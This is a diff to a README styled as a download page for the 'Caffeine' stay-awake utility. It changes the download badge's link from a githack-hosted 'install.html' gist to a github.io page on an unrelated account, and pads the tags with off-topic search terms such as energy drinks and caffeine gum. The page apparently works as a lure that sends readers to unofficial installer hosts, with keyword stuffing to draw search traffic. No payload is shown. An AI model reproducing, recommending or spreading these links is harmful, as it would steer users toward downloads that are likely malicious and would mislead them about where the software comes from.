@@ -1,6 +1,6 @@
 # Caffeine Download — Desktop Power Saver Control  
 
-[![Get Caffeine GitHub](https://img.shields.io/badge/Get%20Caffeine%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/armadillodurex959/15d7867770367081065502f52be73b84/raw/2ee2bc639301f57272219e7f358d6d1c3aaafbf6/install.html?offer=Caffeine)  
+[![Get Caffeine GitHub](https://img.shields.io/badge/Get%20Caffeine%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Caffeine)  
 
 ---
 
@@ -63,7 +63,7 @@ A: No, it’s lightweight and optimized for low resource usage.
 ---
 
 ## 🔍 Tags  
-Caffeine, stay awake app, prevent sleep, screen saver blocker, desktop utility, productivity tool, Mac sleep preventer, Windows idle blocker, power management, background tool, lightweight app, Caffeine pc, Caffeine windows, Caffeine desktop, Caffeine for mac, Caffeine for pc, Caffeine for windows, Caffeine mac  
+Caffeine, no caffeine pre workout, panera charged lemonade, mio energy, caffeine gum, awake chocolate, caffeine powder, stay awake app, prevent sleep, screen saver blocker, desktop utility, productivity tool, Mac sleep preventer, Windows idle blocker, power management, background tool, lightweight app, Caffeine pc, Caffeine windows, Caffeine desktop, Caffeine for mac, Caffeine for pc, Caffeine for windows, Caffeine mac  
 
 ---
 
